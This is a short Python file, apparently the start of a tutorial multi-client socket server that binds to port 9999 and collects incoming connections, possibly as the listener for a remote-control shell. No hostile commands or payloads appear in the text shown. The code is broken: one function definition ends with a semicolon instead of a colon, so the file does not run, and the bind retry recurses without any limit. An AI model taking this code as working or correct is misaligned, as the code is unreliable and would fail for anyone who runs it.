import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_adress = []

# Create a Socket (connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))

# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the Port " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        bind_socket()

# Handling connections from multiple clients and saving to a list
# Closing previous connections when server.py is restarted

def accepting_connections();
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_adress[:]

    while True:
        try:
            conn,address = s.accept()
            s.setblocking(1) # prevents timeouts

            all_connections.append(conn)
            all_adress.append(address)

            print("Connection has been established: " + address[0])

        except:
            print("Error accepting connections")







